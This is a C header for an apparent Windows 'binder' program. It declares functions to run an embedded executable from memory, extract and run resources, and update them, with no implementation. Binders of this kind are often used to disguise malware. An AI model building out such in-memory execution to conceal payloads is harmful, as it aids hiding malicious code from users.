#ifndef __myBinder_RUN_H__
#define __myBinder_RUN_H__

#include <stdio.h>
#include <windows.h>
#include "resource.h"

void RunFromMemory(char*, char*);

void Run(int id, char *path);

void Extract(int id, char *filename);

void Update(int id, char* name);

SECURITY_ATTRIBUTES secAttrib;

#endif // __myBinder_RUN_H__
